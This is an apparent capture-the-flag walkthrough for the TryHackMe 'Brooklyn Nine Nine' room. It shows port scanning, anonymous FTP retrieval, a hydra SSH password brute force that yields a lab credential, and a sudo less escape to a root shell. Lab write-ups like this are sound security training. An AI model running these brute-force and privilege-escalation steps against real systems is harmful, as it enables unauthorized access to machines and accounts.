# [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

# Deploy and get hacking

### User flag

_AHH Jake!_

1. Initial port/service discovery

```bash
namp <TARGET_IP>
```

[SCREEN01]

2. Enumerate anonymous FTP. Connect and download .txt file

```bash
ftp <TARGET_IP>
anonymous
ls -la
mget note_to_jake.txt
y
```

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

3. Use the discovered hint and perform SSH brute force password attack
   - Discovered login: `jake:987654321`

```bash
hydra -l jake -P /root/Tools/wordlists/rockyou.txt ssh://<TARGET_IP>
```

[SCREEN02]

4. SSH into the box and retrieve the user flag

```bash
ssh jake@<TARGET_IP>
cat /home/holt/user.txt
```

[SCREEN03]

---

### Root flag

_Sudo is a good command_

1. Check allowed sudo commands for the current user

```bash
sudo -l
```

[SCREEN04]

2. Abuse an allowed binary using [GTFOBins](https://gtfobins.github.io/gtfobins/less/)

```bash
sudo /usr/bin/less /etc/profile
!/bin/bash
cat /root/root.txt
```

[SCREEN05]
